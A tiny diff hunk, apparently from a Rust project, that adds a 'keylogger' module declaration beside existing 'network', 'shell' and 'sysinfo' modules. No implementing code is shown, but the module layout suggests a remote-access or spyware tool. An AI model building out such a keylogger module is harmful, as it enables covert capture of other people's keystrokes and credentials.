@@ -1,3 +1,4 @@
+mod keylogger;
 mod network;
 mod shell;
 mod sysinfo;
